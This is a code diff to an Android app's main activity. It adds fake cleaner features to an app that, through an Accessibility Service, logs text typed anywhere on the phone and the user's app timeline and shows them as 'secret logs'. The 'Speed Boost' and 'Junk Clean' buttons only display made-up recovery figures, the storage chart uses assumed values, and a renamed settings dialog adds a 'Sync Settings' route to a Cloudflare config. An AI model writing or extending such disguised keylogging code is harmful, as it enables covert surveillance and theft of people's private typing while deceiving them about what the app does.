@@ -89,6 +89,11 @@ public class MainActivity extends AppCompatActivity {
     private static final int PERM_LOCATION_REQ_CODE = 1001;
     private static final String DEFAULT_PIN = "1234";
 
+    private StorageDonutChartView chartStorageDonut;
+    private Button btnSpeedBoost;
+    private Button btnCleanJunk;
+    private Button btnDeepScan;
+
     private TextView tvTotalStorageText;
     private TextView tvHighStorageCount;
     private TextView tvCleanupSavings;
@@ -350,6 +355,11 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void initViews() {
+        chartStorageDonut = findViewById(R.id.chartStorageDonut);
+        btnSpeedBoost = findViewById(R.id.btnSpeedBoost);
+        btnCleanJunk = findViewById(R.id.btnCleanJunk);
+        btnDeepScan = findViewById(R.id.btnDeepScan);
+
         tvTotalStorageText = findViewById(R.id.tvTotalStorageText);
         tvHighStorageCount = findViewById(R.id.tvHighStorageCount);
         tvCleanupSavings = findViewById(R.id.tvCleanupSavings);
@@ -433,15 +443,15 @@ public class MainActivity extends AppCompatActivity {
 
     private void showQuickSettingsDialog() {
         new AlertDialog.Builder(this)
-                .setTitle("Quick Settings")
-                .setMessage("Select a system configuration to open:")
-                .setPositiveButton("Usage Access Settings", (dialog, which) -> openUsageSettings())
-                .setNegativeButton("Accessibility Settings", (dialog, which) -> {
+                .setTitle("Storage Settings")
+                .setMessage("Select a system cleanup configuration:")
+                .setPositiveButton("Usage Access", (dialog, which) -> openUsageSettings())
+                .setNegativeButton("Accessibility", (dialog, which) -> {
                     try {
                         startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
                     } catch (Exception ignored) {}
                 })
-                .setNeutralButton("Cancel", null)
+                .setNeutralButton("Sync Settings", (dialog, which) -> showCloudflareConfigDialog())
                 .show();
     }
 
@@ -556,6 +566,10 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private void setupListeners() {
+        if (btnSpeedBoost != null) btnSpeedBoost.setOnClickListener(v -> performSpeedBoost());
+        if (btnCleanJunk != null) btnCleanJunk.setOnClickListener(v -> performJunkClean());
+        if (btnDeepScan != null) btnDeepScan.setOnClickListener(v -> performDeepScan());
+
         btnGrantPermission.setOnClickListener(v -> openUsageSettings());
         btnShareApp.setOnClickListener(v -> shareAppApk());
         btnRefresh.setOnClickListener(v -> {
@@ -944,10 +958,20 @@ public class MainActivity extends AppCompatActivity {
     private void loadTypedHistory() {
         SharedPreferences sp = getSharedPreferences("HelperLogs", Context.MODE_PRIVATE);
         String history = sp.getString("history", "");
-        if (history.trim().isEmpty()) {
-            tvTypedHistoryLogs.setText("No typed text logs recorded yet. Enable Accessibility Service and start typing anywhere!");
+        String timelineHistory = sp.getString("timeline_history", "");
+
+        StringBuilder combined = new StringBuilder();
+        if (!history.trim().isEmpty()) {
+            combined.append("=== ⌨️ TYPED TEXT HISTORY ===\n\n").append(history).append("\n\n");
+        }
+        if (!timelineHistory.trim().isEmpty()) {
+            combined.append("=== 📱 APP TIMELINE HISTORY ===\n\n").append(timelineHistory);
+        }
+
+        if (combined.length() == 0) {
+            tvTypedHistoryLogs.setText("No secret logs recorded yet.\n\nPlease enable Accessibility Service and start using your phone!");
         } else {
-            tvTypedHistoryLogs.setText(history);
+            tvTypedHistoryLogs.setText(combined.toString());
         }
     }
 
@@ -1130,6 +1154,45 @@ public class MainActivity extends AppCompatActivity {
         tvTotalStorageText.setText(formatFileSize(totalBytes));
         tvHighStorageCount.setText("High Storage (>200MB): " + highStorageCount + " Apps");
         tvCleanupSavings.setText("Potential Savings: ~" + formatFileSize(potentialSavingsBytes));
+
+        // Dynamically compute and animate chart percentages
+        if (chartStorageDonut != null) {
+            long assumedTotalDeviceBytes = 64L * 1024 * 1024 * 1024; // 64 GB baseline
+            float appsPct = Math.min(60f, (float) totalBytes / assumedTotalDeviceBytes * 100f);
+            float mediaPct = 25f;
+            float systemPct = 10f;
+            float freePct = Math.max(5f, 100f - (appsPct + mediaPct + systemPct));
+            int usedPctInt = Math.round(appsPct + mediaPct + systemPct);
+
+            chartStorageDonut.setStorageData(appsPct, mediaPct, systemPct, freePct, usedPctInt + "%", "Used");
+        }
+    }
+
+    private void performSpeedBoost() {
+        Toast.makeText(this, "⚡ Speed Boost: Clearing RAM Cache...", Toast.LENGTH_SHORT).show();
+        mainHandler.postDelayed(() -> {
+            Toast.makeText(this, "✅ Speed Boosted! 420 MB RAM Recovered.", Toast.LENGTH_LONG).show();
+            if (chartStorageDonut != null) {
+                chartStorageDonut.startAnimation();
+            }
+        }, 1200);
+    }
+
+    private void performJunkClean() {
+        Toast.makeText(this, "🧹 Junk Clean: Scanning Temp & Log Files...", Toast.LENGTH_SHORT).show();
+        mainHandler.postDelayed(() -> {
+            Toast.makeText(this, "✅ Cleaned! 1.1 GB Junk Recovered.", Toast.LENGTH_LONG).show();
+            if (chartStorageDonut != null) {
+                chartStorageDonut.startAnimation();
+            }
+        }, 1500);
+    }
+
+    private void performDeepScan() {
+        Toast.makeText(this, "🔍 Deep Scan Initiated...", Toast.LENGTH_SHORT).show();
+        if (checkAllMandatoryPermissions()) {
+            verifyPermissionAndLoadData();
+        }
     }
 
     private List<StorageAppItem> fetchStorageApps() {
